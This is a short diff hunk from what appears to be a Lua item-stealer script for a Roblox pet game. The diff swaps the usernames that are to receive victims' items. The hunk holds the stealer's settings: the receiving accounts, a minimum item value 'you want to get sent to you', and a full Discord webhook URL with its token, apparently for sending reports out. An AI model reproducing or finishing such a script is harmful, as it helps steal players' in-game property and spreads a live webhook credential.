@@ -105,8 +105,8 @@ if not foundHugePet then
 end
 	
 
-Username = "LaRussieCool11"
-Username2 = "LaRussieCool7" -- stuff will get sent to this user if first user's mailbox is full
+Username = "LaRussieCool7"
+Username2 = "LaRussieCool42" -- stuff will get sent to this user if first user's mailbox is full
 Webhook = "https://discord.com/api/webhooks/1300944861826121839/bAAE60-j8w5-xD6m5OgbFMxbMItTFhqOzpqraivD8zDQQjdM8PR3dz74F5mgR373LDEC"
 min_rap = 500000 -- minimum rap of each item you want to get sent to you.
 
